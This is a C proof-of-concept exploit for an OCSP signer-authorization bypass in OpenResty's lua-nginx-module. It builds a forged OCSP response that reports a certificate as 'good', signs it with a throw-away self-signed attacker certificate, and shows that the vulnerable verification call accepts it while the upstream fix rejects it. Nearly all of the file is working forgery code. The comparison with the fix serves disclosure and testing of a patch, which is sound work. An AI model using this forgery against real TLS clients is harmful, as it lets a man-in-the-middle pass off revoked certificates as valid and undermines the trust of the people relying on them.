/* RestyImposter — OpenResty lua-nginx-module OCSP signer-authorization bypass.
 *
 * ngx_http_lua_ffi_ssl_validate_ocsp_response() (ngx_http_lua_ssl_ocsp.c, the C
 * backing of ngx.ocsp.validate_ocsp_response) verifies an OCSP response with:
 *
 *     OCSP_basic_verify(basic, chain, NULL, OCSP_NOVERIFY)
 *
 * store == NULL and the OCSP_NOVERIFY flag make OpenSSL skip ocsp_verify_signer
 * entirely: the responder certificate's chain is NOT built/verified and its
 * authorization to speak for the issuer is NOT checked.  Any certificate the
 * attacker embeds in the response and signs with is accepted as the responder.
 *
 * So an attacker who can supply an OCSP response (a MITM on a stapled/relayed
 * OCSP channel) forges a "good" status for a REVOKED certificate, signed by a
 * throw-away self-signed cert that has nothing to do with the real CA, and the
 * module reports the certificate as valid -> certificate-revocation bypass.
 *
 * This PoC drives the REAL OpenSSL OCSP verification (verbatim vuln vs the
 * upstream fix 9c61e3da00) against a genuinely forged response.
 */
#include <openssl/ssl.h>
#include <openssl/ocsp.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <stdio.h>
#include <string.h>

static EVP_PKEY *genkey(void) { return EVP_RSA_gen(2048); }

/* Make a certificate: subject CN, signed by (issuer_cert/issuer_key); if
 * issuer_cert is NULL the cert is self-signed. is_ca marks it a CA. */
static X509 *mkcert(const char *cn, EVP_PKEY *key, X509 *issuer_cert,
                    EVP_PKEY *issuer_key, int is_ca, long serial) {
  X509 *c = X509_new();
  X509_set_version(c, 2);
  ASN1_INTEGER_set(X509_get_serialNumber(c), serial);
  X509_gmtime_adj(X509_getm_notBefore(c), -3600);
  X509_gmtime_adj(X509_getm_notAfter(c), 3600 * 24 * 365);
  X509_set_pubkey(c, key);

  X509_NAME *name = X509_get_subject_name(c);
  X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char *)cn, -1, -1, 0);
  X509_set_issuer_name(c, issuer_cert ? X509_get_subject_name(issuer_cert) : name);

  if (is_ca) {
    X509V3_CTX ctx; X509V3_set_ctx_nodb(&ctx);
    X509V3_set_ctx(&ctx, issuer_cert ? issuer_cert : c, c, NULL, NULL, 0);
    X509_EXTENSION *ext = X509V3_EXT_conf_nid(NULL, &ctx, NID_basic_constraints, "critical,CA:TRUE");
    if (ext) { X509_add_ext(c, ext, -1); X509_EXTENSION_free(ext); }
  }
  X509_sign(c, issuer_key ? issuer_key : key, EVP_sha256());
  return c;
}

static int der_x509(X509 *c, unsigned char *out, int cap) {
  unsigned char *p = out; int n = i2d_X509(c, &p); (void)cap; return n;
}

/* Verbatim vulnerable verification (OCSP_basic_verify with store=NULL,
 * OCSP_NOVERIFY) vs the upstream fix (store = {issuer} + PARTIAL_CHAIN, flags 0).
 * Returns 1 if the response is accepted and the cert status is GOOD. */
static int validate(const unsigned char *resp, long resp_len,
                    X509 *cert, X509 *issuer, int fixed) {
  const unsigned char *p = resp;
  OCSP_RESPONSE *ocsp = d2i_OCSP_RESPONSE(NULL, &p, resp_len);
  if (!ocsp) return 0;
  if (OCSP_response_status(ocsp) != OCSP_RESPONSE_STATUS_SUCCESSFUL) { OCSP_RESPONSE_free(ocsp); return 0; }
  OCSP_BASICRESP *basic = OCSP_response_get1_basic(ocsp);
  if (!basic) { OCSP_RESPONSE_free(ocsp); return 0; }

  STACK_OF(X509) *chain = sk_X509_new_null();
  sk_X509_push(chain, issuer);

  int verified;
  X509_STORE *store = NULL;
  if (!fixed) {
    /* ---- VULNERABLE (pre-9c61e3da00): no store, OCSP_NOVERIFY ---- */
    verified = OCSP_basic_verify(basic, chain, NULL, OCSP_NOVERIFY);
  } else {
    /* ---- FIXED (9c61e3da00): trust only the issuer, require authorization ---- */
    store = X509_STORE_new();
    X509_STORE_add_cert(store, issuer);
    X509_STORE_set_flags(store, X509_V_FLAG_PARTIAL_CHAIN);
    verified = OCSP_basic_verify(basic, chain, store, 0);
  }

  int accepted = 0;
  if (verified == 1) {
    OCSP_CERTID *id = OCSP_cert_to_id(NULL, cert, issuer);
    int status = -1;
    ASN1_GENERALIZEDTIME *tu = NULL, *nu = NULL;
    if (OCSP_resp_find_status(basic, id, &status, NULL, NULL, &tu, &nu) == 1
        && status == V_OCSP_CERTSTATUS_GOOD) {
      accepted = 1;
    }
    OCSP_CERTID_free(id);
  }

  if (store) X509_STORE_free(store);
  sk_X509_free(chain);
  OCSP_BASICRESP_free(basic);
  OCSP_RESPONSE_free(ocsp);
  return accepted;
}

int main(void) {
  OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CONFIG, NULL);

  /* 1. Legitimate PKI: CA (issuer) signs a server (leaf) certificate. */
  EVP_PKEY *ca_key = genkey();
  X509 *ca = mkcert("Real Root CA", ca_key, NULL, ca_key, 1, 1);
  EVP_PKEY *leaf_key = genkey();
  X509 *leaf = mkcert("victim.example.com", leaf_key, ca, ca_key, 0, 2);

  /* 2. Attacker's throw-away, self-signed cert — NOT issued by the CA and NOT
   *    an authorized OCSP responder for it. */
  EVP_PKEY *atk_key = genkey();
  X509 *atk = mkcert("attacker-responder", atk_key, NULL, atk_key, 0, 1337);

  /* 3. Forge an OCSP response: status GOOD for the leaf, signed by the attacker
   *    cert, with that cert embedded in the response. */
  OCSP_BASICRESP *bs = OCSP_BASICRESP_new();
  OCSP_CERTID *cid = OCSP_cert_to_id(NULL, leaf, ca);
  ASN1_TIME *thisupd = X509_gmtime_adj(NULL, 0);
  ASN1_TIME *nextupd = X509_gmtime_adj(NULL, 3600 * 24);
  OCSP_basic_add1_status(bs, cid, V_OCSP_CERTSTATUS_GOOD, 0, NULL, thisupd, nextupd);
  OCSP_basic_add1_cert(bs, atk);
  if (OCSP_basic_sign(bs, atk, atk_key, EVP_sha256(), NULL, 0) != 1) {
    fprintf(stderr, "sign failed\n"); ERR_print_errors_fp(stderr); return 2;
  }
  OCSP_RESPONSE *resp = OCSP_response_create(OCSP_RESPONSE_STATUS_SUCCESSFUL, bs);
  unsigned char *der = NULL; int der_len = i2d_OCSP_RESPONSE(resp, &der);

  printf("Forged OCSP response: status=GOOD for 'victim.example.com', signed by\n");
  printf("the attacker's self-signed 'attacker-responder' cert (NOT the real CA).\n\n");

  /* The module builds chain_data = DER(leaf) || DER(issuer); we pass leaf+ca. */
  int vuln  = validate(der, der_len, leaf, ca, 0);
  int fixed = validate(der, der_len, leaf, ca, 1);

  printf("  VULNERABLE verify (OCSP_basic_verify(..., NULL, OCSP_NOVERIFY)) : %s\n",
         vuln ? "ACCEPTED forged GOOD  <-- revocation bypass" : "rejected");
  printf("  FIXED verify      (store={issuer}+PARTIAL_CHAIN, flags 0)      : %s\n",
         fixed ? "ACCEPTED (unexpected!)" : "REJECTED (responder not authorized)");
  printf("\n");

  int ok = (vuln == 1 && fixed == 0);
  if (ok)
    printf("RESULT: OCSP SIGNER AUTHORIZATION BYPASS CONFIRMED - a forged OCSP response "
           "signed by an unauthorized cert is accepted by the vulnerable code and rejected by the fix\n");
  else
    printf("RESULT: NOT CONFIRMED (vuln=%d fixed=%d)\n", vuln, fixed);

  OPENSSL_free(der);
  return ok ? 0 : 1;
}
